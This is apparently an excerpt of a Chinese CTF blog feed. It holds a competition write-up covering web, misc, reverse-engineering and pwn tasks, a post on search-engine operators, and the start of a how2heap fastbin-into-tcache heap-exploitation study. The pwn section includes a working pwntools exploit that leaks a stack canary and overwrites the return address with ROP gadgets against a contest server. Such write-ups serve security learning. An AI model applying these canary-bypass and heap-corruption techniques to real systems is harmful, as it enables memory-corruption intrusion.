    <published>2022-09-14T08:34:26.832Z</published>
    <updated>2022-10-16T14:13:47.673Z</updated>
    
    <content type="html"><![CDATA[<p>这个比赛简单，但是好久没有打ctf,感觉自己变废了<a id="more"></a></p><h2 id="解题情况"><a href="#解题情况" class="headerlink" title="解题情况"></a>解题情况</h2><p><img src="%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20220914163354.png" alt="微信截图_20220914163354"></p><h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><h4 id="1-1-目录扫描"><a href="#1-1-目录扫描" class="headerlink" title="1-1 目录扫描"></a>1-1 目录扫描</h4><p>按照经验，猜测robots.txt文件。读取后发现提示<code>&#39;/Sec3et_in_h3r3/fl6g</code></p><p><img src="%E5%B7%9D%E6%B8%9D%E4%B8%AA%E4%BA%BA%E8%B5%9B-wp.assets/0f71dfc995cba4c7e397f8863a1d069.jpg" alt="0f71dfc995cba4c7e397f8863a1d069"></p><p>读取后发现flag。</p><h3 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h3><h4 id="2-3-0101"><a href="#2-3-0101" class="headerlink" title="2-3 0101"></a>2-3 0101</h4><p>打开文本发现16进制数，用winhex写入，然后根据附件开头<code>50 4B 03 04 14 00 00 00 00 00</code> 判断文件为zip,且文件头损坏而打不开，因此修改<code>为50 4B 03 04 14 00 00 00 08 00</code>.在打开压缩包解压。发现一组黑白图片。编写脚本将黑色图片识别为1，将白色图片识别为0，将得到的二进制数转为字符从而得到flag</p><p><img src="image-20220914164829072.png" alt="image-20220914164829072"></p><p>识别脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">@File    :   1.py</span></span><br><span class="line"><span class="string">@Time    :   2022/09/14 14:29:19</span></span><br><span class="line"><span class="string">@Author  :   lexsd6</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">result= <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">304</span>):</span><br><span class="line">    img = Image.open(<span class="string">f"<span class="subst">&#123;i&#125;</span>.png"</span>)</span><br><span class="line">    im_RGB = img.convert(<span class="string">"RGB"</span>) <span class="comment"># 将图片转换为RGB模式</span></span><br><span class="line">    r,g,b =im_RGB.getpixel((<span class="number">1</span>,<span class="number">1</span>)) <span class="comment">#获得rgb值</span></span><br><span class="line">    print(r,g,b)<span class="comment"># 白色rgb值:(255,255,255)</span></span><br><span class="line">    <span class="keyword">if</span> r !=<span class="number">255</span>: <span class="comment">#255是白色</span></span><br><span class="line">        result +=<span class="string">"1"</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        result +=<span class="string">"0"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#将二进制转换为ascii码</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(result),<span class="number">8</span>):</span><br><span class="line">    byte = result[i:i+<span class="number">8</span>]</span><br><span class="line">    print(chr(int(byte,<span class="number">2</span>)),end=<span class="string">""</span>)</span><br></pre></td></tr></table></figure><h3 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h3><h4 id="4-1-simple-dispy"><a href="#4-1-simple-dispy" class="headerlink" title="4-1 simple dispy"></a>4-1 simple dispy</h4><p>跟着文档手搓python字节码。大致还原python 源代码为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">arr=[<span class="number">47378</span>,<span class="number">29475</span>,<span class="number">46200</span>,<span class="number">39869</span>,<span class="number">67243</span>,<span class="number">68695</span>,<span class="number">73129</span>,<span class="number">27171</span>,<span class="number">53832</span>,<span class="number">30653</span>,<span class="number">60541</span>,<span class="number">67276</span>,<span class="number">58816</span>,<span class="number">63571</span>,<span class="number">50131</span>,<span class="number">34471</span>,<span class="number">67922</span>,<span class="number">82293</span>,<span class="number">33259</span>,<span class="number">67538</span>,<span class="number">57810</span>,<span class="number">50339</span>,<span class="number">34632</span>,<span class="number">68754</span>,<span class="number">83192</span>,<span class="number">36077</span>,<span class="number">60424</span>,<span class="number">54547</span>,<span class="number">56308</span>,<span class="number">33565</span>,<span class="number">69425</span>,<span class="number">84024</span>]</span><br><span class="line"></span><br><span class="line">k=<span class="number">22643</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag=input()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">    num=ord(flag[i])*<span class="number">255</span>+k</span><br><span class="line">    <span class="keyword">if</span>(num!=arr[i]):</span><br><span class="line">        print(<span class="string">"Error"</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    print(i)</span><br><span class="line">    k=(k+arr[i])&amp;<span class="number">65535</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">"Right,the flag is DASCTF&#123;Input&#125;"</span>)</span><br></pre></td></tr></table></figure><p>从而逆向写出脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">@File    :   t.py</span></span><br><span class="line"><span class="string">@Time    :   2022/09/14 13:26:54</span></span><br><span class="line"><span class="string">@Author  :   lexsd6</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">arr=[<span class="number">47378</span>,<span class="number">29475</span>,<span class="number">46200</span>,<span class="number">39869</span>,<span class="number">67243</span>,<span class="number">68695</span>,<span class="number">73129</span>,<span class="number">27171</span>,<span class="number">53832</span>,<span class="number">30653</span>,<span class="number">60541</span>,<span class="number">67276</span>,<span class="number">58816</span>,<span class="number">63571</span>,<span class="number">50131</span>,<span class="number">34471</span>,<span class="number">67922</span>,<span class="number">82293</span>,<span class="number">33259</span>,<span class="number">67538</span>,<span class="number">57810</span>,<span class="number">50339</span>,<span class="number">34632</span>,<span class="number">68754</span>,<span class="number">83192</span>,<span class="number">36077</span>,<span class="number">60424</span>,<span class="number">54547</span>,<span class="number">56308</span>,<span class="number">33565</span>,<span class="number">69425</span>,<span class="number">84024</span>]</span><br><span class="line"></span><br><span class="line">k=<span class="number">22643</span></span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">flag=input()</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">for i in range(32):</span></span><br><span class="line"><span class="string">    num=ord(flag[i])*255+k</span></span><br><span class="line"><span class="string">    if(num!=arr[i]):</span></span><br><span class="line"><span class="string">        print("Error")</span></span><br><span class="line"><span class="string">        exit(0)</span></span><br><span class="line"><span class="string">    print(i)</span></span><br><span class="line"><span class="string">    k=(k+arr[i])&amp;65535</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">print("Right,the flag is DASCTF&#123;Input&#125;")</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line">flag=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line"> flag+=chr(int((arr[i]-k)/<span class="number">255</span>))</span><br><span class="line"> k=(k+arr[i])%<span class="number">65536</span></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><h3 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h3><h4 id="5-1-ez-canary"><a href="#5-1-ez-canary" class="headerlink" title="5-1 ez_canary"></a>5-1 ez_canary</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &#39;&#x2F;home&#x2F;lexs&#x2F;Desktop&#x2F;pwntest&#x2F;2022&#x2F;cy&#x2F;ez_canary&#x2F;ez_canary&#39;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>题目开了canary 和 nx，但是没开PIE.</p><p>但是通过逆向源代码和动态gdb，可以得知我们的输入的<code>Username</code>可以溢出到栈上，我们输入的password 可以覆盖 <code>Username</code>的同时溢出到栈上。因此，我们合理布局code让<code>Username</code> 刚好把canary低位的’\x00’覆盖，从而泄露出canary。由于PIE未开，我们可以源文件后门，从而在Password 输入合理布局覆盖<code>Username</code>和canary，让程序流跳到我们后门上。（远程不知道为啥打不通，后赖用 ret 调节下栈 ）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">@File    :   exp.py</span></span><br><span class="line"><span class="string">@Time    :   2022/09/14 10:21:45</span></span><br><span class="line"><span class="string">@Author  :   lexsd6</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="comment">#from libcfind import *</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">""" </span></span><br><span class="line"><span class="string">0x000000000040142c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040142e : pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000401430 : pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000401432 : pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040142b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040142f : pop rbp ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x00000000004011fd : pop rbp ; ret</span></span><br><span class="line"><span class="string">0x0000000000401433 : pop rdi ; ret</span></span><br><span class="line"><span class="string">0x0000000000401431 : pop rsi ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040142d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040101a : ret</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">local_mote=<span class="number">0</span></span><br><span class="line">elf=<span class="string">'./ez_canary'</span></span><br><span class="line">e=ELF(elf)</span><br><span class="line">context.arch=e.arch</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">ip_port=[<span class="string">'43.143.139.234'</span>,<span class="number">50305</span>]</span><br><span class="line"></span><br><span class="line">debug=<span class="keyword">lambda</span> gdb_cmd=<span class="string">''</span>: gdb.attach(p,gdb_cmd) <span class="keyword">if</span> local_mote==<span class="number">1</span> <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local_mote==<span class="number">1</span> :</span><br><span class="line">   p=process(elf)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">   p=remote(ip_port[<span class="number">0</span>],ip_port[<span class="number">-1</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">debug()</span><br><span class="line">p.sendline(<span class="string">'x'</span>*<span class="number">0xa</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">cananry=(u64(p.recv(<span class="number">7</span>)+<span class="string">'\x00'</span>))*<span class="number">0x100</span></span><br><span class="line">cd=(u64(p.recv(<span class="number">6</span>)+<span class="string">'\x00'</span>*<span class="number">2</span>))*<span class="number">0x100</span></span><br><span class="line">log.info(hex(cananry))</span><br><span class="line">log.info(hex(cd))</span><br><span class="line"><span class="comment">#print(p.recvuntil('!Password:'))</span></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">ret=<span class="number">0x000000000040101a</span></span><br><span class="line">back=<span class="number">0x000000000401216</span></span><br><span class="line">p.sendline(<span class="string">'k'</span>*(<span class="number">0x10</span>+<span class="number">4</span>)+p64(cananry)+p64(ret)*<span class="number">2</span>+p64(back)*<span class="number">2</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;这个比赛简单，但是好久没有打ctf,感觉自己变废了</summary>
    
    
    
    <category term="CTF" scheme="lexsd6.github.io/categories/CTF/"/>
    
    
    <category term="wp" scheme="lexsd6.github.io/tags/wp/"/>
    
    <category term="pwn" scheme="lexsd6.github.io/tags/pwn/"/>
    
    <category term="re" scheme="lexsd6.github.io/tags/re/"/>
    
  </entry>
  
  <entry>
    <title>搜索引擎语法学习</title>
    <link href="lexsd6.github.io/2022/07/26/%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E8%AF%AD%E6%B3%95%E5%AD%A6%E4%B9%A0/"/>
    <id>lexsd6.github.io/2022/07/26/%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E8%AF%AD%E6%B3%95%E5%AD%A6%E4%B9%A0/</id>
    <published>2022-07-26T15:09:16.237Z</published>
    <updated>2022-07-26T15:11:58.202Z</updated>
    
    <content type="html"><![CDATA[<p>随着互联网的发展，搜索引擎已成为搜集网上信息资料最常用的导航工具。大多数的网络用户们使用搜索引擎时,习惯于“关键词+回车键”的操作方式。这是最简单、最省心的方式,但是,反馈的结果往往伴随着无数的冗余信息,不一定令人满意。<a id="more"></a>应为某任务需要在规定的时间内快速找到在互联网某处存放的某需要信息。但由于百度必应谷歌等存在广告、收费项目、爬虫复读信息的干扰</p><h2 id="基础搜索引擎语法"><a href="#基础搜索引擎语法" class="headerlink" title="基础搜索引擎语法"></a>基础搜索引擎语法</h2><h3 id="Intitle"><a href="#Intitle" class="headerlink" title="Intitle"></a>Intitle</h3><p>搜索在网页标题中的关键字。即把搜索的内容限定到网页(文章)的标题.</p><p>用法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">intitle:关键字</span><br></pre></td></tr></table></figure><p>例如：</p><p><img src="image-20220726111422242.png" alt="image-20220726111422242"></p><h3 id="Site"><a href="#Site" class="headerlink" title="Site"></a>Site</h3><p>把搜索范围限定到特点网站中。即只在特点网站中查找内容。</p><p>用法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:域名&#x2F;网址</span><br></pre></td></tr></table></figure><p>例如：</p><p><img src="image-20220726112049243.png" alt="image-20220726112049243"></p><h3 id="Inurl"><a href="#Inurl" class="headerlink" title="Inurl"></a>Inurl</h3><p>搜索在url中含有关键词的网页。返回在url(网址)中含有我们关键的网站。</p><p>用法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">inurl:关键词</span><br></pre></td></tr></table></figure><p>例如：</p><p><img src="image-20220726112538893.png" alt="image-20220726112538893"></p><h3 id="Link"><a href="#Link" class="headerlink" title="Link"></a>Link</h3><p>搜索所有链接到关键字的网页。比如说<code>link:baidu.com</code>就返回所有与百度做了链接的url。</p><p>用法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">link:url</span><br></pre></td></tr></table></figure><p>例如：</p><p><img src="image-20220726113106807.png" alt="image-20220726113106807"></p><h3 id="Filetype"><a href="#Filetype" class="headerlink" title="Filetype"></a>Filetype</h3><p>搜索指定后缀名的文件。即，搜索引擎返回的内容直接是某指定后缀名的文件而不是网页。</p><p>用法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filetype:type(pdf,txt,jpg,png,mp4......)</span><br></pre></td></tr></table></figure><p>例如：</p><p><img src="image-20220726113802788.png" alt="image-20220726113802788"></p><h3 id="Intext"><a href="#Intext" class="headerlink" title="Intext"></a>Intext</h3><p>搜索在文章内容中包含某关键字的网页。</p><p>用法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">intext:关键字</span><br></pre></td></tr></table></figure><p>例如：</p><p><img src="image-20220726162307144.png" alt="image-20220726162307144"></p><h3 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h3><p>提供一个和指定url更多信息的页面列表.</p><p>用法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">info:url</span><br></pre></td></tr></table></figure><p>例如：</p><p><img src="image-20220726114955373.png" alt="image-20220726114955373"></p><h2 id="强制搜索"><a href="#强制搜索" class="headerlink" title="强制搜索"></a>强制搜索</h2><p>强制搜索的意思是必须完整出现我所查询的关键字。例如 我强制搜索 “lexsd6，那么搜获引擎必优先返回我 ”<strong>lexsd6</strong>“ 而不是优先返回”d6“或”lexs”的内容。</p><p>强制搜索分为两类：长关键搜索和名称搜索。</p><h3 id="长关键搜索"><a href="#长关键搜索" class="headerlink" title="长关键搜索"></a>长关键搜索</h3><p>主要用于比配过长的关键词，比如说某题目。</p><p>用法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">”关键词“</span><br></pre></td></tr></table></figure><p>未用长关键强制搜索：</p><p><img src="image-20220726150151368.png" alt="image-20220726150151368"></p><p>用长关键强制搜索：</p><p><img src="image-20220726150134573.png" alt="image-20220726150134573"></p><h3 id="名称搜索"><a href="#名称搜索" class="headerlink" title="名称搜索"></a>名称搜索</h3><p>名称搜索，顾名思义是用来搜索作品名称的，用书刊名、歌曲名、文献名来搜索名称的。</p><p>用法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">《关键词》</span><br></pre></td></tr></table></figure><p>未名称搜索：</p><p><img src="image-20220726152126178.png" alt="image-20220726152126178"></p><p>名称搜索：</p><p><img src="image-20220726152058324.png" alt="image-20220726152058324"></p><h2 id="逻辑语法"><a href="#逻辑语法" class="headerlink" title="逻辑语法"></a>逻辑语法</h2><p>在我们使用搜索引擎时，有时候一个关键词并不能满足我们使用需求，要多个关键词同时作用才能达到我们的需求。但是搜索引擎并不会直接明白我们输入关键词的意思，我们要通过一定的<strong>逻辑语法</strong>来告诉搜索引擎，我们输入的各个关键词之间的关系与搜索的目的。</p><h3 id="逻辑与"><a href="#逻辑与" class="headerlink" title="逻辑与"></a>逻辑与</h3><p>表示我们要同时搜索两个关键词或两个以上的关键词的内容。</p><p>例如我们现在有两个关键词A、B，我们要查询同时有A、B关键词的内容。用程序逻辑表达为：A&amp;B。</p><p>用法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">A B</span><br></pre></td></tr></table></figure><p>即在两关键词以空格隔开即可。</p><h3 id="逻辑或"><a href="#逻辑或" class="headerlink" title="逻辑或"></a>逻辑或</h3><p>表示我们要搜索至包含两个关键词或两个以上的关键词中至少用一个关键词的内容。</p><p>例如我们现在有两个关键词A、B，我们要查询有A关键词的内容、B关键词的内容即同时有AB关键词的内容。用程序逻辑表达为：A|B。</p><p>用法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">A|B</span><br></pre></td></tr></table></figure><p>即在两关键词以<code>&quot;|&quot;</code>隔开即可。</p><h3 id="逻辑非"><a href="#逻辑非" class="headerlink" title="逻辑非"></a>逻辑非</h3><p>表示我们要搜索至包含两个关键词或两个以上的关键词中，有其中一个关键词出现，就没有其它关键的内容。</p><p>例如我们现在有两个关键词A、B，我们要查询有A关键词且没有B关键词的内容、B关键词且没有A关键词的内容。</p><p>用法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">A -B</span><br></pre></td></tr></table></figure><p>即在两关键词以<code>&quot; -&quot;</code>隔开即可。</p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>熟练使用搜索引擎有利于我们快速在网上查找信息，有个于扩大我们知识面和提高我们的办公效率<del>（方便网上测试找题）</del>。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;随着互联网的发展，搜索引擎已成为搜集网上信息资料最常用的导航工具。大多数的网络用户们使用搜索引擎时,习惯于“关键词+回车键”的操作方式。这是最简单、最省心的方式,但是,反馈的结果往往伴随着无数的冗余信息,不一定令人满意。</summary>
    
    
    
    <category term="tools" scheme="lexsd6.github.io/categories/tools/"/>
    
    
    <category term="problem_resolve" scheme="lexsd6.github.io/tags/problem-resolve/"/>
    
  </entry>
  
  <entry>
    <title>how2heap-fastbin_reverse_into_tcache-学习</title>
    <link href="lexsd6.github.io/2022/06/17/how2heap-fastbin_reverse_into_tcache-%E5%AD%A6%E4%B9%A0/"/>
    <id>lexsd6.github.io/2022/06/17/how2heap-fastbin_reverse_into_tcache-%E5%AD%A6%E4%B9%A0/</id>
    <published>2022-06-17T07:33:24.000Z</published>
    <updated>2022-06-18T11:42:10.843Z</updated>
    
    <content type="html"><![CDATA[<p><code>fastbin reverse into tcache</code>是指利用tcache为空而fastbin不为空，堆管理把fashbin放入tcahe时进行的攻击。<code>fastbin reverse into tcache</code>一度感觉很鸡肋，但仔细看大佬分析后，发现是我态年轻了，理解不到位。<a id="more"></a></p><h2 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h2><p>1.让任意地址进入tcache中，再取出tcache进行任意地址写。</p><p>2.对任意一个地址，写入一个可控的堆上地址。</p><h2 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h2><p>1.能反复创建释放14个以上的fastbin。</p><p>2.能修改其中一个fastbin的fd</p><p>3.用tcache机制</p><h2 id="分析how2heap源码"><a href="#分析how2heap源码" class="headerlink" title="分析how2heap源码"></a>分析how2heap源码</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">size_t</span> allocsize = <span class="number">0x40</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">"\n"</span></span><br><span class="line">    <span class="string">"This attack is intended to have a similar effect to the unsorted_bin_attack,\n"</span></span><br><span class="line">    <span class="string">"except it works with a small allocation size (allocsize &lt;= 0x78).\n"</span></span><br><span class="line">    <span class="string">"The goal is to set things up so that a call to malloc(allocsize) will write\n"</span></span><br><span class="line">    <span class="string">"a large unsigned value to the stack.\n\n"</span></span><br><span class="line">  